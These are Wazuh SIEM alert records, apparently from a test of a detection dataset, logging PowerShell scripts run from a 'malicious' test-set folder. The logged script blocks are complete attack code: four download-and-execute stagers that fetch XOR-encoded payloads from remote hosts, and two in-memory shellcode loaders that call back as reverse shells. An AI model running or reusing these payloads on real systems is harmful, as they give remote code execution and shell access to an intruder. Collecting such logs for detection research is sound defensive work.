{"timestamp":"2026-07-06T02:20:51.566+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":6,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304451.3598198","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:11.4905145Z","eventRecordID":"145536","processID":"8612","threadID":"8284","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n[SYSteM.NeT.SErvicEPoiNTMANageR]::ExpEct100CONTInUe = 0;$WC=NeW-OBJect SYsTEM.NET.WeBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDeRs.ADd('User-Agent',$u);$WC.PRoXy = [SySTem.NeT.WebREqUeST]::DeFAUltWEBPRoXY;$wc.PROxy.CreDEntiAls = [SYSTem.NEt.CredENtIaLCaCHe]::DEfauLTNETWorKCreDENtIaLS;$K='SZ9z1*o6&jc{AE(N3)RXih78e!u:wq}B';$i=0;[ChAr[]]$b=([Char[]]($wc.DowNloAdSTRIng(\"http://192.168.1.101:8080/index.asp\")))|%{$_-bXOr$k[$I++%$K.LENGth]};IEX ($B-jOIN'')\r\n\r\nScriptBlock ID: 3b757a35-4add-4154-9e4e-81b16bf1d7a5\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3166.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"[SYSteM.NeT.SErvicEPoiNTMANageR]::ExpEct100CONTInUe = 0;$WC=NeW-OBJect SYsTEM.NET.WeBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDeRs.ADd('User-Agent',$u);$WC.PRoXy = [SySTem.NeT.WebREqUeST]::DeFAUltWEBPRoXY;$wc.PROxy.CreDEntiAls = [SYSTem.NEt.CredENtIaLCaCHe]::DEfauLTNETWorKCreDENtIaLS;$K='SZ9z1*o6&amp;jc{AE(N3)RXih78e!u:wq}B';$i=0;[ChAr[]]$b=([Char[]]($wc.DowNloAdSTRIng(\\\"http://192.168.1.101:8080/index.asp\\\")))|%{$_-bXOr$k[$I++%$K.LENGth]};IEX ($B-jOIN'')","scriptBlockId":"3b757a35-4add-4154-9e4e-81b16bf1d7a5","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3166.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:52.502+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":7,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304452.3602224","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:12.2803921Z","eventRecordID":"145540","processID":"1804","threadID":"1676","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$WC=NeW-ObJecT SystEm.NEt.WEbCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErs.ADD('User-Agent',$u);$WC.PRoxy = [SYstEM.NEt.WEbREquEsT]::DeFauLtWebPrOxY;$wc.ProXY.CredEnTiaLS = [SYStEM.NET.CREdentiALCaChe]::DeFAULtNeTwoRKCReDenTialS;$K='d78d8f2b3029de8151bacf54e436d292';$I=0;[CHaR[]]$B=([cHaR[]]($WC.DownloaDSTRing(\"http://47.88.17.109:80/index.asp\")))|%{$_-BXOR$k[$i++%$k.LENgtH]};IEX ($B-JOIN'')\r\n\r\nScriptBlock ID: 42330c88-002b-4a64-ad33-9cb1dde3441d\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3180.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$WC=NeW-ObJecT SystEm.NEt.WEbCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErs.ADD('User-Agent',$u);$WC.PRoxy = [SYstEM.NEt.WEbREquEsT]::DeFauLtWebPrOxY;$wc.ProXY.CredEnTiaLS = [SYStEM.NET.CREdentiALCaChe]::DeFAULtNeTwoRKCReDenTialS;$K='d78d8f2b3029de8151bacf54e436d292';$I=0;[CHaR[]]$B=([cHaR[]]($WC.DownloaDSTRing(\\\"http://47.88.17.109:80/index.asp\\\")))|%{$_-BXOR$k[$i++%$k.LENgtH]};IEX ($B-JOIN'')","scriptBlockId":"42330c88-002b-4a64-ad33-9cb1dde3441d","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3180.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:52.603+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":8,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304452.3606006","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:13.0248567Z","eventRecordID":"145544","processID":"8212","threadID":"8336","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n[SYSTEM.NeT.SERVicEPoINtMaNageR]::EXpECt100CoNTiNue = 0;$wC=NEW-OBJECT SySTEM.Net.WEBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDeRs.ADd('User-Agent',$u);$wc.PRoxY = [SYsTem.NET.WEbReQuESt]::DEFaultWEbPrOxy;$wC.PRoxy.CreDenTiAls = [SySTEm.NEt.CrEDEntiaLCacHE]::DEfAuLtNETWORkCreDEnTials;$K='L_:\\H;i%(Gq5xB1N[*fYVwpmbS>dE)J<';$i=0;[chAr[]]$B=([CHar[]]($wc.DownLOAdSTrInG(\"http://192.168.0.40:8080/index.asp\")))|%{$_-bXOr$k[$i++%$k.LeNgth]};IEX ($B-JOIn'')\r\n\r\nScriptBlock ID: aeb5f9e9-4873-4d42-bc78-2a69d4471fa2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3198.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"[SYSTEM.NeT.SERVicEPoINtMaNageR]::EXpECt100CoNTiNue = 0;$wC=NEW-OBJECT SySTEM.Net.WEBCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDeRs.ADd('User-Agent',$u);$wc.PRoxY = [SYsTem.NET.WEbReQuESt]::DEFaultWEbPrOxy;$wC.PRoxy.CreDenTiAls = [SySTEm.NEt.CrEDEntiaLCacHE]::DEfAuLtNETWORkCreDEnTials;$K='L_:\\\\H;i%(Gq5xB1N[*fYVwpmbS&gt;dE)J&lt;';$i=0;[chAr[]]$B=([CHar[]]($wc.DownLOAdSTrInG(\\\"http://192.168.0.40:8080/index.asp\\\")))|%{$_-bXOr$k[$i++%$k.LeNgth]};IEX ($B-JOIn'')","scriptBlockId":"aeb5f9e9-4873-4d42-bc78-2a69d4471fa2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3198.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:53.995+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":164,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304453.3610037","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:13.9011554Z","eventRecordID":"145548","processID":"8328","threadID":"6616","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x6c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}\r\n\r\nScriptBlock ID: 40c00027-4769-422b-80b0-be38905250f4\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3207.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$1 = '$c = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x6c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";$cmd = \\\"-nop -noni -enc \\\";iex \\\"&amp; $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -noni -enc\\\";iex \\\"&amp; powershell $cmd $gq\\\";}","scriptBlockId":"40c00027-4769-422b-80b0-be38905250f4","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3207.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:54.909+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":165,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304454.3622320","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:14.6778187Z","eventRecordID":"145552","processID":"4212","threadID":"4540","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$ifr = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ifr -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x5c,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$KTV=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($KTV.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$KTV,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 41af86e6-2e29-41e6-b5aa-040f32e06d9f\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3212.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$ifr = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ifr -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x5c,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$KTV=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($KTV.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$KTV,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"41af86e6-2e29-41e6-b5aa-040f32e06d9f","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3212.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:54.982+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":9,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304454.3633309","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:15.5172281Z","eventRecordID":"145556","processID":"2152","threadID":"4452","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n[SYsteM.Net.SErviCePoInTMaNaGER]::EXPECt100CoNtINue = 0;$Wc=NEW-OBjeCt SyStEM.NEt.WEbCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErS.ADd('User-Agent',$u);$wC.Proxy = [SYSTEm.NEt.WeBREquEsT]::DeFaulTWEBPrOxy;$wc.PRoXy.CREDENTiALS = [SYsTEM.NET.CReDEntIALCAChE]::DEFAultNetWorkCReDENtIaLs;$K='c5114664d5cae6566f528cd9f789363c';$I=0;[ChAr[]]$B=([ChAr[]]($WC.DOWnLoadStRinG(\"http://192.168.0.10:8080/index.asp\")))|%{$_-BXOR$K[$i++%$k.LENgTh]};IEX ($b-joIn'')\r\n\r\nScriptBlock ID: c92dbb12-1df2-4839-b147-5e756236922c\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3216.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"[SYsteM.Net.SErviCePoInTMaNaGER]::EXPECt100CoNtINue = 0;$Wc=NEW-OBjeCt SyStEM.NEt.WEbCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErS.ADd('User-Agent',$u);$wC.Proxy = [SYSTEm.NEt.WeBREquEsT]::DeFaulTWEBPrOxy;$wc.PRoXy.CREDENTiALS = [SYsTEM.NET.CReDEntIALCAChE]::DEFAultNetWorkCReDENtIaLs;$K='c5114664d5cae6566f528cd9f789363c';$I=0;[ChAr[]]$B=([ChAr[]]($WC.DOWnLoadStRinG(\\\"http://192.168.0.10:8080/index.asp\\\")))|%{$_-BXOR$K[$i++%$k.LENgTh]};IEX ($b-joIn'')","scriptBlockId":"c92dbb12-1df2-4839-b147-5e756236922c","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3216.ps1"}}},"location":"EventChannel"}
